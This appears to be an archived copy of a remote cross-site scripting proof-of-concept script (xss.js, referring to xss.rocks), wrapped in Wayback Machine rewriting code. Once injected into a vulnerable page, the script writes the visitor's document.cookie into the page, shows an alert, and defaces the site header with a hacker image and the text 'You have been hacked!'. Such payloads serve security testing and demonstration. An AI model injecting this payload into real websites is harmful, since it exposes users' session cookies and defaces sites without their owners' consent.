var _____WB$wombat$assign$function_____ = function(name) {
    return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name];
};

if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }

{
    let window = _____WB$wombat$assign$function_____("window");
    let self = _____WB$wombat$assign$function_____("self");
    let document = _____WB$wombat$assign$function_____("document");
    let location = _____WB$wombat$assign$function_____("location");
    let top = _____WB$wombat$assign$function_____("top");
    let parent = _____WB$wombat$assign$function_____("parent");
    let frames = _____WB$wombat$assign$function_____("frames");
    let opener = _____WB$wombat$assign$function_____("opener");

    document.write("This is remote text via xss.js located at xss.rocks " + document.cookie);
    alert("This is remote text via xss.js located at jsdelivr.net");

    var txt = document.createElement("h2");
    txt.textContent = "You have been hacked!";
    txt.style.color = "white"
    var div = document.getElementById("header");
    div.querySelector("img").src = "https://i.ibb.co/JCc9PZC/hacker.png"
    div.appendChild(txt);
}
